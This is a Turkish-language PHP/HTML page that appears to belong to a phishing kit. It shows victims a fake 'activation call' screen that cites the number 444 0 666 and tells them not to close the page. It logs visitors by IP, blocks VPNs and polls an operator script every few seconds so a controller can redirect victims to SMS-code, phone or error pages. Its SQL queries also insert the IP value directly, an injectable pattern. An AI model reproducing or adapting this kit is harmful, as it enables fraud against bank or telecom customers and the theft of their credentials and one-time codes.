<?php include_once("config.php"); include_once("./admin/Data/Server/GrabIP.php"); include_once("./admin/Data/Server/BlockVPN.php");  include_once("./admin/Data/Server/BanControl.php");
   $pdo->query("UPDATE logs SET durum = 'Bildirim Ekranı' WHERE ip = '{$ip}'");
   $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
   if(empty($check)) {
      header('Location: /');
   }
   ?>
<!DOCTYPE html>
<html lang="tr">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      <title>Mobile Sayfa</title>
      <style>
         @font-face {
         font-family: 'KelveticaNobis';
         src: url('./assets/fonts/OwwgtWr5KJVN.otf') format('opentype');
         font-weight: normal;
         font-style: normal;
         }
         body, html {
         background-color: #ffffff;
         padding: 0;
         max-width: 414px;
         margin: 0 auto;
         font-family: 'KelveticaNobis', sans-serif;
         }
         header {
         width: 100%;
         height: 106px;
         background-image: url('./assets/images/mobilbildirim.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         .main {
         min-height: 805px;
         width: 100%;
         height: 805px;
         background-image: url('./assets/images/irpyabLMrXNK.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         input.form-control {
         width: 85%;
         height: 50px;
         font-family: 'KelveticaNobis', sans-serif;
         margin-bottom: 10px;
         margin-top: 5px;
         border: none;
         font-size: 16px;
         margin-left: 15px;
         margin-right: 15px;
         padding-left: 20px;
         }
         input.form-control:focus {
         outline: none;
         box-shadow: none;
         }
         button.btn {
         width: 90%;
         height: 50px;
         margin-top: 20px;
         background-color: #2ea8ab;
         border: none;
         color: #fff;
         font-size: 14px;
         cursor: pointer;
         border-radius: 0;
         }
         .loading-text {
         font-size: 24px;
         font-weight: bold;
         color: #333; /* Yazı rengi */
         margin-bottom: 20px; /* Yazının altında boşluk */
         }
         .countdown {
         position: absolute;
         top: 15%;
         left: 50%;
         transform: translate(-50%, -50%);
         color: green;
         font-size: 35px;
         font-weight: 600;
         font-family: 'KelveticaNobis';
         }
      </style>
   </head>
   <body>
      <header></header>
      <center>
      <img src="./assets/images/ugi.png" style="margin-bottom: -50px;" width="270" alt="">
      </center>
      <br><br><br>
      <br><br>
 
      <div style="font-size: 18px; text-align: center;">Aktivasyonunu tamamlaman için seni 444 0 666 numaralı telefondan arayacağız. Aktivasyon araması gerçekleşmiyorsa telefonundaki engelli arama listesini kontrol etmeni ve 444 0 666 numaralı telefon engellenmişse, engeli kaldırmanı rica ederiz. Lütfen bu ekranı kapatma.</div>
     <div class="loading-text" style="font-size: 20px;color: rgb(72 145 75);text-align: center;padding-top: 20px;">
        Siz olduğunuzu doğrulamak için cep telefonunuza bir arama gönderdik. Lütfen aramayı açıp 1'i tuşlayınız <span id="countdown" style="font-size: 22px; color: rgb(72 145 75);text-align: center;">120</span> saniye içerisinde onaylayın.
      </div>
      <script>
         let count = 120;
         const countdownElement = document.getElementById("countdown");
         
         const interval = setInterval(() => {
             count--;
             countdownElement.textContent = count;
         
             if (count <= 0) {
                 clearInterval(interval);
             }
         }, 1000);
      </script>
      <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg == 'sms') {
                  window.location.href = '/sms';
              }
              if (msg == 'tebrikler') {
                  window.location.href = '/basarili';
              }
              if (msg == 'telefon') {
                  window.location.href = '/phone';
              }
              if (msg == 'bildirim') {
                  window.location.href = '/bildirim';
              }
              if (msg == 'hata_sms') {
                  window.location.href = '/sms?error=1';
              }
              if (msg == 'hata_hesap') {
                  window.location.href = '/?error=1';
              }
              if (msg == 'basa_dondur') {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
   </body>
</html>